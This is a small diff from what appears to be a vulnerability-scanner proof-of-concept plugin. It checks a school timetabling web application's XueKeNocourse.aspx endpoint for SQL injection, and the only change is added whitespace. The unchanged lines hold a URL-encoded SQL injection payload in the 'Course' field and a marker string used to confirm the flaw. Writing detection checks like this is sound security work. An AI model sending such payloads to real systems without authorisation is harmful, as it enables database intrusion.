@@ -51,7 +51,7 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             payload = "/time/shezhiSystem/XueKeNocourse.aspx"
             data = "Course=1%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--"
-            url = arg+payload
+            url = arg + payload
             code, head, res, errcode, finalurl = hh.http(url, data)
             if code == 500 or code == 200 and "testXQ17" in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
